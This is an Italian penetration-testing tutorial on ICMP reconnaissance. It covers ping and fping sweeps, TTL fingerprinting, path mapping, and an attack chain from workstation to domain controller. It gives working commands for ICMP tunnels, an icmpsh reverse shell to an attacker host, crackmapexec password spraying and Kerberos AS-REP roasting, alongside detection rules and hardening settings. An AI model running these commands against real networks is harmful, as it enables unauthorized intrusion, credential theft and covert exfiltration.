---
title: Ping e Tecniche ICMP e Scansioni Attive Per Il Recon
slug: ping
description: >-
  Analizza il comportamento della rete con ping, fping e hping3. Tecniche di
  ricognizione ICMP, host discovery e test su firewall usati nei pentest.
image: /ping.webp
draft: false
date: 2026-01-26T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - icmp
  - ping
---

# Ping e Tecniche ICMP e Scansioni Attive Per Il Recon

Durante un internal assessment, hai ottenuto l'accesso iniziale a una workstation in un segmento di rete enterprise. L'ICMP Echo Reply non è filtrato. Questo non è solo un segnale di rete aperta: è l'opportunità per mappare la topologia, fingerprintare i sistemi operativi e stabilire covert channel per il movimento laterale. Questa guida copre l'intero ciclo operativo da reconnaissance a post-compromise.

## TL;DR Operativo (Flusso a Step)

1. **Host Discovery Massivo:** Utilizzo di fping per sweep rapido delle subnet interne, bypassando i limiti del ping tradizionale.
2. **OS Fingerprinting via TTL:** Analisi del Time-To-Live per identificare sistemi Windows (TTL~~128) vs Linux (TTL~~64) senza banner grabbing.
3. **Network Path Mapping:** Determinazione del numero di hop e identificazione di firewall intermedi attraverso analisi degli errori ICMP.
4. **Pre-Exploitation Validation:** Test di connettività verso target specifici prima di lanciare exploit rumorosi.
5. **Covert Channel Establishment:** Configurazione di tunnel ICMP per command & control o data exfiltration in ambienti filtrati.
6. **Lateral Movement Preparation:** Mappatura delle trust relationships attraverso l'analisi della connettività di rete.

***

## Fase 1: Ricognizione & Enumeration

**Scenario:** Accesso iniziale a una workstation in una rete enterprise. Devi identificare rapidamente gli host attivi senza generare alert eccessivi.

**Host Discovery Massivo con fping:**

```bash
fping -a -g 192.168.1.0/24 2>/dev/null
```

**Output Processing per Target List:**

```bash
fping -a -g 192.168.1.0/24 2>/dev/null > live_hosts.txt
```

**TTL Analysis per OS Fingerprinting:**

```bash
ping -c 1 192.168.1.100 | grep -o 'ttl=[0-9]*'
```

**TTL Value Interpretation Script:**

```bash
ping -c 1 192.168.1.100 | awk -F'ttl=' '{print $2}' | awk '{print $1}'
```

**Hop Count Determination:**

```bash
ping -c 1 -t 1 192.168.1.100
```

**Progressive Hop Testing:**

```bash
for i in {1..30}; do ping -c 1 -t $i 192.168.1.100 2>&1 | grep -q "Time to live exceeded" && echo "Hop $i: TTL exceeded" || break; done
```

**Combined Nmap Discovery (ARP + ICMP):**

```bash
nmap -sn -PR 192.168.1.0/24
```

**Hybrid Discovery Approach con Rate Limiting:**

```bash
nmap -sn --min-hostgroup 64 --min-parallelism 10 192.168.1.0/24
```

***

## Fase 2: Initial Exploitation

**Target Prioritization via TTL Analysis:**

```bash
while read ip; do ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep -o 'ttl=[0-9]*' | cut -d= -f2); [ "$ttl" -gt 120 ] && echo "$ip: Windows (TTL=$ttl)"; done < live_hosts.txt
```

**Pre-Exploit Connectivity Validation:**

```bash
ping -c 1 -W 2 192.168.1.50 >/dev/null && echo "Target responsive"
```

**ICMP Filtering Test con Size Variation:**

```bash
ping -c 1 -s 100 192.168.1.100
```

**MTU Path Discovery con DF Bit:**

```bash
ping -c 1 -M do -s 1472 192.168.1.100
```

**Automated Exploit Pre-Check Script:**

```bash
#!/bin/bash
TARGET=$1
if ping -c 1 -W 2 $TARGET >/dev/null 2>&1; then
    echo "[+] $TARGET alive, launching service enumeration..."
    nmap -p 445,3389,22,21 --open $TARGET
fi
```

**Rate Limited Discovery per Stealth:**

```bash
fping -a -g 192.168.1.0/24 -r 0 -i 1000 2>/dev/null
```

**ICMP Fragmentation Testing in Filtered Environments:**

```bash
ping -c 1 -s 2000 192.168.1.100
```

***

## Fase 3: Post-Compromise & Privilege Escalation

**Internal Network Enumeration da Host Compromesso:**

```bash
ping -c 1 192.168.1.1
```

**Sequential Internal Host Discovery:**

```bash
for i in {1..254}; do ping -c 1 -W 50 192.168.1.$i | grep -q "ttl" && echo "192.168.1.$i alive"; done
```

**Management Network Connectivity Test:**

```bash
ping -c 1 10.10.10.1
```

**Server Network Connectivity Test:**

```bash
ping -c 1 172.16.0.1
```

**ICMP Tunnel Setup con ptunnel-ng:**

```bash
sudo ptunnel-ng -c 192.168.1.100 -p 192.168.1.1 -l 2222 -r 22
```

**ICMP Backdoor Detection:**

```bash
tcpdump -n 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply' -c 10
```

**Privilege Escalation Path Discovery:**

```bash
ping -c 1 -W 1 192.168.2.1 2>/dev/null && echo "Segment 192.168.2.0/24 reachable"
```

**TTL Deception Detection:**

```bash
tcpdump -n 'icmp and ip[8] < 30' -c 5
```

***

## Fase 4: Lateral Movement & Pivoting

**External Path Analysis:**

```bash
traceroute -n 8.8.8.8
```

**Internal Subnet Path Analysis:**

```bash
traceroute -n 192.168.2.1
```

**Pivot Host Connectivity Test:**

```bash
ssh user@compromised-host "ping -c 1 10.10.10.1"
```

**ICMP Covert Channel con icmpsh:**

```bash
./icmpsh_m.py 192.168.1.100 192.168.1.50
```

**Traffic Obfuscation con Legitimate Ping Flood:**

```bash
ping -f -c 1000 192.168.1.1
```

**Multi-Segment Discovery da Pivot:**

```bash
ssh user@192.168.1.100 "fping -a -g 10.10.10.0/24 2>/dev/null"
```

**VLAN Hopping Consideration Test:**

```bash
ping -c 1 -b 192.168.1.255
```

***

## Attack Chain Reale: Da ICMP Sweep a Domain Pivot

**Scenario:** Compromissione di una workstation in un ambiente enterprise con 500+ host. L'obiettivo è identificare e compromettere i domain controller.

**Step 1 - Initial Sweep:**

```bash
fping -a -g 192.168.1.0/23 2>/dev/null | head -20 > initial_targets.txt
```

**Step 2 - OS Fingerprinting:**

```bash
for ip in $(cat initial_targets.txt); do ttl=$(ping -c 1 -W 1 $ip 2>/dev/null | grep -o 'ttl=[0-9]*' | cut -d= -f2); [ "$ttl" -gt 120 ] && echo "$ip: Windows" >> windows_hosts.txt; done
```

**Step 3 - Service Enumeration:**

```bash
nmap -p 445,3389 -iL windows_hosts.txt --open -oG smb_scan.gnmap
```

**Step 4 - Credential Testing:**

```bash
crackmapexec smb windows_hosts.txt -u 'Administrator' -p 'Password123' --continue-on-success
```

**Step 5 - Network Path Discovery:**

```bash
for ip in $(cat compromised_hosts.txt); do traceroute -n $ip | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" | tail -1 | awk '{print $2}' >> internal_gateways.txt; done
```

**Step 6 - Pivot to Server Segment:**

```bash
ssh administrator@compromised_host "ping -c 1 10.10.10.1"
```

**Step 7 - Domain Controller Targeting:**

```bash
nmap -p 88,389,636 -iL server_segment.txt --open
```

**Step 8 - Kerberos Attacks:**

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -output hashes.txt
```

***

## ICMP Tunneling: Technical Implementation and Limitations

**Quando Utilizzare Realisticamente ICMP Tunneling:**

* Ambienti con filtering aggressivo su tutte le porte TCP/UDP ma ICMP permesso
* Reti di air-gapped systems con controlli perimetrali stringenti
* Scenario di data exfiltration per piccoli dataset critici (\< 1MB)
* Situazioni dove il rischio di detection è accettabile rispetto al beneficio

**Limiti Tecnici Realistici:**

```bash
# MTU Limitations - massimo payload pratico
ping -c 1 -s 500 192.168.1.100
```

```bash
# IDS Detection Test per payload anomali
tcpdump -i eth0 'icmp and (ip[2:2] > 84)'
```

**ptunnel vs icmpsh - Technical Comparison:**

```bash
# ptunnel - TCP over ICMP (più stabile per tunnel lunghi)
sudo ptunnel-ng -c server_ip -p proxy_ip -l 1080 -r 22
```

```bash
# icmpsh - Interactive shell (più agile per sessioni brevi)
./icmpsh_m.py attacker_ip victim_ip
```

**Detection Signatures in Enterprise Environments:**

```bash
# Suricata Rule per ICMP Tunnel Detection
alert icmp any any -> any any (msg:"Suspicious ICMP Size"; dsize:>200; itype:8; sid:1000001;)
```

```bash
# Zeek Script per ICMP Anomaly Detection
event icmp_sent(c: connection, icmp: icmp_info)
{
    if (icmp$len > 200) {
        NOTICE([$note=ICMP::Large_Packet,
                $conn=c,
                $msg=fmt("Large ICMP packet from %s", c$id$orig_h)]);
    }
}
```

**Perché ICMP Tunneling Non È Stealth Come Si Pensa:**

* Enterprise IDS/IPS hanno signature dedicate per payload ICMP anomali
* NetFlow e analisi comportamentale rilevano pattern di traffico ICMP inconsueti
* I pacchetti con size atipici (> 150 bytes) sono immediatamente sospetti
* La consistenza nel timing dei pacchetti ICMP è facilmente profilabile

***

## Fase 5: Detection & Hardening Enterprise

**ICMP Sweep Detection Rule:**

```bash
# Snort/Suricata Rule per ICMP sweep
alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:"ICMP Sweep Detected"; dsize:0; itype:8; threshold: type threshold, track by_src, count 50, seconds 10; sid:1000002;)
```

**TTL Anomaly Detection:**

```bash
# Alert su TTL values inconsistenti
alert icmp any any -> any any (msg:"TTL Anomaly Detected"; ttl:<30; sid:1000003;)
```

**ICMP Tunnel Signature:**

```bash
# Detect ICMP packets con data payload
alert icmp any any -> any any (msg:"ICMP Tunnel Potential"; dsize:>100; content:"|00 00 00 00|"; depth:4; sid:1000004;)
```

**Enterprise Rate Limiting Configuration:**

```bash
# Linux iptables rate limiting
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/second --limit-burst 3 -j ACCEPT
```

```bash
# Cisco IOS Rate Limiting
access-list 101 permit icmp any any echo
rate-limit input access-group 101 8000 8000 8000 conform-action transmit exceed-action drop
```

**Strategic ICMP Filtering:**

```bash
# Allow ICMP solo da management networks
iptables -A INPUT -p icmp -s 10.10.10.0/24 -j ACCEPT
```

```bash
# Drop all other ICMP
iptables -A INPUT -p icmp -j DROP
```

**Comprehensive ICMP Logging:**

```bash
# Log all ICMP packets
iptables -A INPUT -p icmp -j LOG --log-prefix "ICMP Packet: " --log-level 4
```

**Windows ICMP Hardening via Registry:**

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d 0 /f
```

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDeadGWDetect" /t REG_DWORD /d 0 /f
```

**Network Device Hardening:**

```bash
# Cisco ASA ICMP Inspection
icmp permit any echo-reply outside
icmp permit any echo outside
icmp permit any time-exceeded outside
icmp permit any unreachable outside
```

***

## Errori Comuni Che Vedo Negli Assessment Reali

1. **ICMP completamente bloccato su tutti i segmenti:** Disabilitazione totale che rompe il path MTU discovery e strumenti di troubleshooting legittimi.
2. **Mancato rate limiting su edge firewall:** Permettere ICMP flood senza limitazioni, rendendo possibile DoS basic o mascheramento di attività.
3. **TTL anomalies ignorate nei log SIEM:** Sistemi SIEM che non correlano variazioni anomale del TTL con potenziali attività di spoofing o tunneling.
4. **ICMP aperto tra VLAN diverse senza necessità:** Configurazioni che permettono ICMP tra VLAN di utenti e server, esponendo informazioni di rete.
5. **Ping consentito da segmenti utente verso domain controller:** Policy di rete che facilitano l'identificazione di target critici attraverso semplici ping sweep.
6. **Logging ICMP disabilitato per performance:** Eliminazione della capacità di rilevare host discovery iniziale e pattern di scanning.
7. **Mancanza di baseline per traffico ICMP normale:** Impossibilità di identificare anomalie sofisticate senza una baseline di riferimento.
8. **Inconsistent ICMP policies across network devices:** Firewall diversi con policy diverse che creano inconsistency rilevabili.

***

## Playbook Operativo 80/20: ICMP in Internal Assessment

| Obiettivo                    | Azione Concreta                                 | Strumento Primario              | Metrica di Successo                 |
| ---------------------------- | ----------------------------------------------- | ------------------------------- | ----------------------------------- |
| Host discovery massivo       | Sweep di subnet interne con rate limiting       | fping                           | 95% degli host attivi identificati  |
| OS fingerprinting rapido     | Analisi TTL delle risposte ICMP                 | ping + awk                      | Corretta classificazione OS >85%    |
| Network path mapping         | Determinazione hop count verso target critici   | traceroute                      | Identificazione di tutti i hop      |
| Pre-exploitation validation  | Test di connettività prima di lanciare exploit  | ping con timeout personalizzato | Zero falsi negativi                 |
| Covert channel detection     | Monitoraggio di payload ICMP anomali            | tcpdump con filtri avanzati     | Rilevamento di tunnel attivi        |
| Lateral movement preparation | Mappatura della connettività tra segmenti       | ping da host compromessi        | Identificazione trust relationships |
| Detection evasion            | Rate limiting e variazione dei pattern di probe | Scripting customizzato          | Scanning non rilevato da IDS        |

***

## Lab Multi-Step: Internal Network Enumeration to AD Compromise

**Scenario "Enterprise ICMP Kill Chain":** Ambiente di lab che replica una rete enterprise con Active Directory complesso, multi-segmento e sistemi legacy.

**Kill Chain Completa:**

1. **Initial Access:** Compromissione di workstation via phishing simulato con payload basic.
2. **Network Discovery:** Utilizzo di tecniche ICMP per mappare gli host attivi senza triggerare alert.
3. **Target Prioritization:** Fingerprinting OS via TTL per identificare server Windows e domain controller.
4. **Service Enumeration:** Scansione mirata dei servizi sui target identificati come Windows.
5. **Credential Compromise:** Sfruttamento di password reuse tra workstation e server.
6. **Lateral Movement:** Pivot verso segmenti server utilizzando credenziali compromesse.
7. **Domain Privilege Escalation:** Attacchi Kerberos verso domain controller identificati.
8. **Persistence & Exfiltration:** Setup di covert channel ICMP per data exfiltration persistente.

**Technical Learning Objectives:**

* Host discovery massivo con evasion techniques
* OS fingerprinting accurato attraverso analisi TTL
* Configurazione e detection di ICMP tunneling
* Integrazione di ICMP reconnaissance nella kill chain AD
* Techniques per evitare il rilevamento durante la fase discovery

## **CTA Tecnica e Concreta:** Questo scenario completo, con infrastruttura realistica e debrief tecnico dettagliato, è parte del percorso **"Advanced Internal Network Assessment"** di HackITA. Impara a collegare tecniche di host discovery con attacchi avanzati ad Active Directory in ambienti controllati.

## 🔗 Link Interni HackITA (Correlati alla Kill Chain ICMP → AD)

* [https://hackita.it/articoli/nmap](https://hackita.it/articoli/nmap)
  → Approfondimento su host discovery avanzato, tecniche ARP/ICMP e ottimizzazione scansioni in ambienti interni.
* [https://hackita.it/articoli/kerberos-attacks](https://hackita.it/articoli/kerberos-attacks)
  → Collegamento diretto alla fase Domain Compromise descritta nell’articolo (AS-REP Roasting, Kerberoasting, ecc.).
* [https://hackita.it/servizi](https://hackita.it/servizi)
  → Per test reali su infrastrutture enterprise, simulazioni Red Team e validazione segmentazione ICMP/VLAN.

***

## 🌍 Link Esterni Tecnici di Riferimento

* [https://attack.mitre.org/techniques/T1046/](https://attack.mitre.org/techniques/T1046/)
  → MITRE ATT\&CK – Network Service Discovery. Inquadra ICMP sweep e host discovery nel framework ufficiale.
* [https://nmap.org/book/man-host-discovery.html](https://nmap.org/book/man-host-discovery.html)
  → Documentazione ufficiale Nmap su host discovery (ICMP, ARP, TCP ping) per confronto tecnico con fping.
* [https://www.rfc-editor.org/rfc/rfc792](https://www.rfc-editor.org/rfc/rfc792)
  → RFC ufficiale ICMP. Base tecnica per comprendere TTL, Type/Code e limiti strutturali del protocollo.

***

*Questa guida è per scopi formativi in ambienti controllati e autorizzati. Ogni test su sistemi di terze parti richiede autorizzazione scritta esplicita.*
